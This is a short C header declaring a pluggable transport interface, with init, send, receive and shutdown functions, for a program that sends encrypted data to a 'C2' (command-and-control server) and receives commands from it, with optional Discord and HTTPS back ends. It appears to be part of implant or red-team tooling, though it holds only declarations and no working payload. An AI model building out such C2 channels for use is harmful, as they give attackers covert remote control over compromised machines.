#ifndef TRANSPORT_H
#define TRANSPORT_H

#include <stddef.h>

typedef struct {
  /* Initialize the transport with a JSON config string
     Returns 0 on success, -1 on error */
  int (*init)(const char *config_json);

  /* Send data (already padded and encrypted by the core) to the C2
     Returns 0 on success, -1 on error */
  int (*send)(const unsigned char *data, size_t len);

  /* Receive a command from the C2, blocking/polling up to timeout_ms
     Returns 1 if data was received, 0 on timeout, -1 on error.
     *len represents the buffer capacity on entry, and bytes written on exit. */
  int (*recv)(unsigned char *buffer, size_t *len, int timeout_ms);

  /* Clean up resources */
  void (*shutdown)(void);
} transport_t;

#ifdef USE_DISCORD
extern transport_t transport_discord;
#endif

#ifdef USE_HTTPS
extern transport_t transport_https;
#endif

#endif // TRANSPORT_H
